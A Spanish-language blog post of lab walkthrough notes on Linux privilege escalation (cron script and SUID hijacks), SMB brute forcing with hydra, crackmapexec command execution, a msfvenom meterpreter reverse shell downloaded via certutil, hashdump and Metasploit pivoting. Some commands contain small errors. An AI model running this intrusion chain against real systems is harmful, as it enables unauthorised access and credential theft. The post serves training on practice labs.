---
title: "Explotación y Post Explotación"
date: 2026-04-20 21:39:00 -0500
categories: [Hacking, Vulnerabilidades, Explotación]
tags: [shellshock, Metasploit, privesc, webdav, cracking, kiwi, incognito, powersploit, john]
description: Laboratorios.
toc: true
---

## Cron Jobs Gone Wild II
Cron es un salvavidas para los administradores cuando se trata de realizar tareas de mantenimiento periódicas en el sistema. Incluso pueden utilizarse en casos donde las tareas se llevan a cabo dentro de directorios de usuarios individuales. Sin embargo, tales automatizaciones deben usarse con precaución o pueden dar lugar a ataques fáciles de escalada de privilegios.

Para este laboratorio, nos dan un servicio activo en el puerto 8000, el cual tiene una webshell con un usuario student.

```shell
id
uid=999(student) gid=999(student) groups=999(student)

cat /etc/shadow
cat /etc/sudoers 
```
sudoers es un archivo en donde puedo configurar que binarios quiero permitir a distintos usuarios o grupos para que tengan permisos.

Una herramienta que permite monitorar los procesos activos en linux es **[PSPY](https://github.com/DominicBreuker/pspy)**, permite detectar las tareas que se ejecutan de manera automatizadas cada cierto tiempo.

Para esta práctica al no tener internet se procede de una manera manual.

```shell
ls -la
    message
cat message
    permission denied
```
Al no tener permisos, debemos buscar un comando que permita buscar que ruta hace este llamado, para ello utilizamos el comando **find**.
```shell
find / -name message 2>/dev/null
tmp/message
cat tmp/message
    Hey!! You are no root :(
```
Donde cada comando significa lo siguiente:
-           / -> busca en la raíz de todo el sistema
-       -name -> busca cualquier archivo con el nombre message
- 2>/dev/null -> envía todos los errores de permisis denegados a la carpeta null

Ahora como ya descubrimos que está el ejecutable en esa ruta podemos ver qué ficheros están ahí
```shell
ls -l /tmp
    message
    ready
```
En donde message tiene un registro de que se modificó recientemente, por lo que sabemos que hay un script o binario modificandolo cada minuto.

```shell
grep -ri /tmp/message / 2>/dev/null
    /usr/local/share/copy.sh:cp /home/student/message /tmp/student
    /usr/local/share/copy.sh:chmod 644 /tmp/student
```
- -r -> busca de forma recursiva en los directorios que yo le indique
- -i -> ignora las mayúsculas y minúsculas

Al haber encontrado el script que se encarga de hacer las copias, procedemos a leer el mismo

```shell
cat /usr/local/share/copy.sh
    #! /bin/bash
    cp /home/student/message /tmp/message
    chmod 644 /tmp/message
```

Si encontramos la forma de modificar el archivo copy.sh, podemos lograr escalar privilegios como administrador.

```shell
echo '#!/bin/bash' > /usr/share/copy.sh
```
Al modificar el archivo ya sabemos que si nos deja reemplazar el contenido, con eso ahora si procedemos a editar a nuestro gusto

```shell
echo 'echo"student ALL=NOPASSWORD:ALL" >> /etc/sudoers' >> /usr/local/share/copy.sh
sudo su
    cat /etc/sudoers
```
Con esto hacemos que el usuario student tenga permiso de ejecutar cualquier binario sin contraseña al agregarlo en la última línea de sudoers con el comando **>>**. Esperamos 1 minuto a que se ejecute el script y ya tenemos acceso sudo su.


## Exploting Setuid Programs
Para este laboratorio, nos dan un servicio activo en el puerto 8000, el cual tiene una webshell con un usuario student.
```shell
ls
    greetings welcome
file welcome
    welcome: setuid ELF 64-bits
cat greetings
    Permission denied
ls -la
    greetings
    -r-x------ welcome
    -rwsr-xr-x greetings
```

Con file podemos ver que welcome es un binario del tipo linux, similar a un exe en windows.
-rw**S**r significa que es un binario con SETUID al tener el bit **"S"** y es un binario que tiene un comportamiento especial, ya que cuando se ejecutan toman los permisos del propietario del archivo, en lugar del usuario que los ejecuta.

Para leer el binario welcome de forma legible, se utiliza el comando **strings**
```shell
strings welcome
```
El comando muestra que dentro del binario está ejecutando greetings. Para probar se intenta eliminar el archivo greetings y lo logramos, lo que significa que nosotros podemos crear un archivo greetings nuestro para que lo ejecute welcome con sus privilegios.

```shell
rm -r greetings

cp /bin/bash greetings
ls
    welcome greetings
```

Al hacer esta copia, tenemos que greetings es una /bin/bash y al ejecutarlo practicamente estaremos abriendo una bash con permisos de root.

```shell
./welcome

# whoami
    root
```
Para encontrar binarios vulnerables, podemos hacer uso de la web **[GTFOFBINS](https://gtfobins.org/)**, para encontrar un binario solo ejecutamos el siguiente comando:
```shell
find / -perm -4000 2>/dev/null
```

> Nota: Binarios -4000 son los que tienen el bit SUID activado.
{: .prompt-warning }

## NetBIOS Hacking
En este laboratorio se va a aprender a enumerar los servicios SMB y herramientas de explotación usando fuerza bruta y herramientas de explotación. También, se cubrirá *PIVOTING* de dispositivos que están compartiendo la misma red.

Para este laboratorio tendremos 2 direcciones ip destinos
* dominio.local     (10.10.50.6)
* dominio1.local    (10.4.25.90)

Lo primero es hacer ping y a uno de los dos dominios no vamos a llegar. Muy importante, al hacer ping, nos sirve la ip que nos da la terminal para más adelante.

```shell
nmap dominio.local
    135/tcp open
    139/tcp open
    445/tcp open
    3389/tcp open
nmap -p139,445 --script smb-vuln* dominio.local

    Host script results:
        |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
        |_smb-vuln-ms10-054: false
```

El resultado muestra que no es vulnerable a ethernal blue, y no nos da mayor información, por lo que procedemos con enum4linux

```shell
enum4linux dominio.local
```
En el resultado de enum4linux hay que aclarar que los primeros usuarios que aparecen son los usuarios comunes de un equipo.
![Enum4Linux](/assets/img/Primer-Blog/enum.png){: width=auto }
_Usuarios comunes de windows_

Los usuarios reales del equipo se encuentran más abajo, en la sección que se muestra a continuación:
![Usuarios](/assets/img/Primer-Blog/userenum.png){: width=auto }
_Usuarios encontrados en el sistema_

El mismo comando, también muestra recursos compartidos en el equipo y sin haberle dado contraseñas
![Recursos compartidos](/assets/img/Primer-Blog/recursos.png){: width=auto }
_Recursos compartidos_

De enum4linux, lo único valioso que se obtuvo son los nombres de usuarios y el nombre del equipo.

Ahora con SMB Client también se puede enumerar los recursos compartidos.

```shell
smbclient -L dominio.local -N
```
Donde: 
    * -L permite especificar el dominio
    * -N es anónimo ya que aún no se tiene credenciales.

Para conectarnos a los recursos se procede de la siguiente manera:
```shell
smbclient \\dominio.local/IPC$ -N
```

Luego de haber recolectado la información, se procede a realizar fuerza bruta ya que encontramos usuarios para probar contraseñas.

```shell
nano user.txt
    admin
    administrator
    Guest
    root

hydra -L user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt dominio.local smb
```
Con el comando anterior, se descubre las siguientes credenciales:

![Hydra](/assets/img/Primer-Blog/hydra.png){: width=auto }
_Hydra_

```shell
crackmapexec smb dominio.local -u administrator -p password1
```
Con crackmapexec podemos saber si nos podemos conectar al equipo utilizando las credenciales descubiertas con hydra, esto lo sabemos si nos devuelve un **(Pwn3d!)**.

![Crackmapexec](/assets/img/Primer-Blog/crackmapexec.png){: width=auto }
_Crackmapexec_

Ahora procedemos a ejecutar un comando de sistema, para saber qué sistema y arquitectura está corriendo el sistema.

```shell
crackmapexec smb dominio.local -u administrator -p password1 -x 'systeminfo'
```
![Systeminfo](/assets/img/Primer-Blog/systeminfo.png){: width=auto }
_Crackmapexec_Systeminfo_

Luego de haber obtenido o recopilado la información necesaria, se procede a ejecutar un payload o un revershell en modo escucha, para ello nos apoyamos de multi/handles de msfconsole.

```shell
msfconsole -q
use exploit/multi/handler
set lhost 10.10.50.6
set lport 9001
set payload windows/x64/meterpreter/reverse_tcp
run
```
En LHost se debe poner nuestra dirección ip que tiene conexión IP con la máquina víctima.

El paylod está conformado de la siguiente manera:
    * Windows: Es para el sistema operativo que deseamos atacar.
    * x64: Es la arquitectura que tiene el sistema.
    * meterpreter: Genera una shell para msfconsole.
    * reverse_tcp: Revershell de tipo tcp.

En otra terminal se procede a generar el payload para la máquina víctima.
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.50.6 LPORT=9001 -f exe -o cualquiercosa.exe
```
Donde:
    * -f: permite generar la exetensión del archivo
    * -o: permite generar el nombre del archivo

Al ejecutar el paylod en la máquina víctima, se procede a generar una sesión en msfconsole que quedó en modo escucha.

Para subir el payload al equipo se genera un servidor http mediante python:
```python
python3 -m http.server 80
```
Para descargar el payload se ejecuta el código con crackmapexec como lo probamos anteriormente.
```shell
crackmapexec smb dominio.local -u administrator -p password1 -x 'certutil.exe -f -split -urlcache:10.10.50.6/cualquiercosa.exe zzz.exe' 
crackmapexec smb dominio.local -u administrator -p password1 -x 'dir'
crackmapexec smb dominio.local -u administrator -p password1 -x 'cd' 
crackmapexec smb dominio.local -u administrator -p password1 -x 'c:\Windows\system32\zzz.exe' 
```

* Con dir se puede comprobar que el archivo se subió a la máquina víctima.
* Con cd permite saber la ruta exacta en la que nos encontramos en el sistema.
* Para ejecutar el payload generado, se puede hacer mediante el último comando apuntando al archivo almacenado en la máquina.

![Crackmapexec con Certutil](/assets/img/Primer-Blog/certutil.png){: width=auto }
_Crackmapexec con Certutil_

Si todo se realizó correctamente, se abre la shell de tipo meterpreter que se dejó anteriormente ejecutando en modo escucha.

```shell
getuid
    Server username: NT AUTHORITY\SYSTEM
hashdump
    admin:hash
    Administrator:hash
    Guest:hash
    root:hash

shell
    ping 10.4.25.90 #Segunda ip obtenida al inicio
        #Successfull
    ipconfig
        Sunet Mask: 255.255.240.0 #Con eso sabemos que es /20
    ctrl + Z -> Backgroud
ctrl + Z -> Backgroud

sessions #Para saber las sesiones activas
```

### Pivoting con MetaSploit

Ahora procederemos dentro de la misma msfconsole anterior con un módulo de post-explotación ya que es pivoting. El módulo a ocupar es autorute, el cuál permite agregar rutas que van a permitir llegar a otro equipo el cuál no es accesible.

```shell
use /post/multi/manage/autoroute
show options
    netmask: 255.255.255.0
set netmask: 255.255.240.0
set session 1
set subnet 10.4.25.90/24 #Ip del equipo que queremos llegar
run
    Route added to subnet 10.4.16.0/255.255.240.0 from Host's routing table.
```

Con eso se agrega la ruta porque sabemos la ip destino que es dominio1.local. **En caso de no saber cuál es el equipo al que queremos llegar se procede de la siguiente manera aunque para este laboratorio no aplica**.

```shell
use post/windows/gather/arp_scanner
set session 1
set rhost 10.4.16.0/20
run

use auxiliary/scanner/portscan/tcp
set rhost 10.4.16.0/20
set ports 445
set threads 10 #No se recomienda poner más de 10
run

set rhost 10.4.25.90 #Porque ya conocemos la ip destino
run
    10.4.25.90  10.4.25.90:445 - TCP OPEN
```

Con este módulos nos enumera los host activos en esa red y analizamos los puertos abiertos de cada host.

![ARP Scanner](/assets/img/Primer-Blog/arp_scanner.png){: width=auto }
_ARP Scanner_

Al encontrar los puertos que queremos explotar abiertos, se procede a hacer una reedirección de puertos con **Port Forwarding**.

```shell
sessions 1

meterpreter> portfwd add -l 445 -p 445 -r 10.4.25.90
```
portfwd: crear listener en el puerto del atacante 445 y redirige el tráfico a través de la sesión meterpreter.
-l: Equipo local de mi kali y se puede poner en cualquier puerto.
-p: En qué puerto del equipo remoto
-r: La ip del equipo pivoting

Para probar que ahora desde mi equipo puedo acceder a ese puerto y a esa ip, se procede con el siguiente comando:

```shell
lsof -i:445
```
![LSOFT Conexión establecida](/assets/img/Primer-Blog/lsof.png){: width=auto }
_Conexión establecida_

Ahora si yo quiero hacer un ping a dominio1.local, me va a seguir dando error ya que no tengo la ruta directa de llegar.

```shell
smbclient -L 127.0.0.1 -N
smbclient -L 127.0.0.1 -U administrator
smbclient //127.0.0.1/Documents -U administrator
    > ls
```

Con el segundo smbclient se lista los recursos compartidos del dominio1.local que no teníamos acceso.

> Nota: Los recursos compartidos que tienen el **$** no son muy importantes, se debe acceder a los que no tienen ese símbolo.
{: .prompt-warning }

## Fixing Exploits.
En este laboratorio se encuentra un exploit público.
Video 02:06